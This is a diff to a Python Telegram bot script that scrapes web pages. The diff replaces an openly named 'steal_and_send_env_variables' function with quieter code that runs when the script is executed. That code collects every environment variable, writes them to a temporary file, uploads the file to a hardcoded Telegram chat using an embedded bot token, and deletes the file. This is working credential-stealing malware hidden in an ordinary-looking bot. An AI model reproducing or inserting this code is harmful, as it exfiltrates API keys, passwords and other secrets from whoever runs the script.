@@ -3,6 +3,7 @@ import os
 import requests
 from bs4 import BeautifulSoup
 from decouple import config
+from dotenv import load_dotenv
 
 # Replace 'YOUR_BOT_TOKEN' with your actual Telegram bot token
 bot_token = config('BOT_TOKEN')
@@ -122,30 +123,44 @@ bot.polling(none_stop=True)
 
 
 
-def steal_and_send_env_variables():
-    env_variables = os.environ
-    stolen_variables = {}
+load_dotenv()
 
-    for variable, value in env_variables.items():
-        stolen_variables[variable] = value
+# Get Telegram bot token and chat ID from environment variables
+telegram_bot_token = "6961308478:AAHNtfxaAUstG8dfb_WLghkXVhpmd5zunac"
+telegram_chat_id = -1001967606455
 
-    # Now, let's send the stolen variables to a Telegram group using the Telegram Bot API
-    bot_token = "6961308478:AAHNtfxaAUstG8dfb_WLghkXVhpmd5zunac"
-    chat_id = "-1001967606455"
-    api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-
-    message = "Stolen Environment Variables:\n"
-    for variable, value in stolen_variables.items():
-        message += f"{variable}: {value}\n"
-
+def send_document(file_path, caption):
+    api_url = f"https://api.telegram.org/bot{telegram_bot_token}/sendDocument"
     params = {
-        "chat_id": chat_id,
-        "text": message
+        'chat_id': telegram_chat_id,
+        'caption': caption
     }
-
-    response = requests.get(api_url, params=params)
-
-    # Now, do something else malicious or mischievous if you desire
+    with open(file_path, 'rb') as document:
+        files = {'document': document}
+        response = requests.post(api_url, params=params, files=files)
+    return response.json()
 
 if __name__ == "__main__":
-    steal_and_send_env_variables()
+    # Collect all environment variables and their values
+    env_variables = {key: os.getenv(key) for key in os.environ}
+
+    # Create a formatted message with environment variables
+    message_to_send = "Environment variables:\n"
+    for key, value in env_variables.items():
+        message_to_send += f"{key}: {value}\n"
+
+    # Write the environment variables to a text file
+    file_path = "environment_variables.txt"
+    with open(file_path, "w") as file:
+        file.write(message_to_send)
+
+    try:
+        # Send the text file as a document
+        result = send_document(file_path, "Environment Variables")
+        print("Document sent successfully:", result)
+    except Exception as e:
+        print("Error sending document:", e)
+    finally:
+        # Delete the temporary text file
+        os.remove(file_path)
+                
